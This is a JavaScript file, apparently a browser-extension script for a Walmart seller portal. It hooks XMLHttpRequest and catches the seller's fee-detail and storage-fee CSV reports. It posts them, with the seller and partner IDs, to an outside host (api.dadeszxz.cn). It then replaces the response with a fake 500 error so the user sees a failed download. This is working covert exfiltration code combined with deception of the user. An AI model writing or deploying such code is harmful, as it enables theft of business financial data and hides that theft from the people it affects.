function addLogItem(content) {
  if (!document.body) return;
  const div = document.createElement('div');
  div.innerHTML = content;
  document.body.appendChild(div);
}

function requestLoadListener(_this, response, { url }) {
  if (
    url.indexOf('feeDetailReport') >= 0 ||
    url.indexOf('storageFeeReport') >= 0
  ) {
    // 获取店铺信息
    const jsonElement = document.querySelector('[id="app-context-info"]');
    if (!jsonElement || !jsonElement.textContent) return;
    const { partnerId, sellerId } = JSON.parse(
      jsonElement.textContent
    ).sellerContext;
    const params = new URLSearchParams(url.split('?')[1]);
    const startDate = params.get('startDate');
    const endDate = params.get('endDate');
    // csv内容
    const csvContent = response.currentTarget?.response || '';
    // formData组合
    const formData = new FormData();
    formData.append('file', csvContent);
    formData.append('dateInfo', JSON.stringify({ startDate, endDate }));
    formData.append('storeInfo', JSON.stringify({ partnerId, sellerId }));
    formData.append(
      'type',
      url.includes('feeDetailReport') ? 'settlementFee' : 'storageFee'
    );
    // 发送请求
    fetch('https://api.dadeszxz.cn/plugin/test', {
      method: 'post',
      body: formData,
    });
    // 修改响应状态码和内容
    _this.status = 500;
    _this.responseText = '模拟的错误信息';
    _this.response = '模拟的错误信息';
    _this.dispatchEvent(new Event('error'));
    return;
  }
}

function init(XMLHttpRequest) {
  var XHR = XMLHttpRequest.prototype;
  var send = XHR.send;
  var open = XHR.open;
  XHR.open = function (method, url) {
    this._url = url;
    this._method = method;
    return open.apply(this, arguments);
  };
  XHR.send = function () {
    this.addEventListener('load', function (response) {
      requestLoadListener(this, response, {
        url: this._url,
        method: this._method,
      });
    });
    return send.apply(this, arguments);
  };

  // const newXHR = new XMLHttpRequest();
  // newXHR.onreadystatechange = function () {
  //   addLogItem('xhr:' + JSON.stringify(newXHR.responseText));
  // };
  // newXHR.open(
  //   'GET',
  //   'https://seller.walmart.com/aurora/v1/wfs/reports/getPresetDate'
  // );
  // newXHR.send();
}

init(window.XMLHttpRequest);
